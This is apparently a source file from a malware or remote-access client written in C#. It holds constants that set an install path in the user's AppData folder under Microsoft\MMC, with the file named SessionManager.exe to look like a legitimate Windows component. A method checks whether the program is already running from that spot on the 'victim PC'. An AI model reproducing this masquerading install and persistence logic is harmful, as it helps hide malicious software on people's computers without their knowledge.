using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Client
{
    public static class Constants
    {
        public static string AppDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static string MMCFolder = System.IO.Path.GetFullPath(AppDataFolder + @"\Microsoft\MMC");

        /// <summary>
        /// Target location to victim PC
        /// </summary>
        public static string MMCFile = System.IO.Path.GetFullPath(MMCFolder + @"\SessionManager.exe");

        public static string MyPath = Assembly.GetExecutingAssembly().Location;

        /// <summary>
        /// Checks if the current program is already in the victim's PC via path.
        /// </summary>
        public static bool IsInVictimPC() {
            return Utilities.Filepath.NormalizePath(MyPath) == Utilities.Filepath.NormalizePath(MMCFile);
        }

        public static float Version = 0.1f;
    }
}
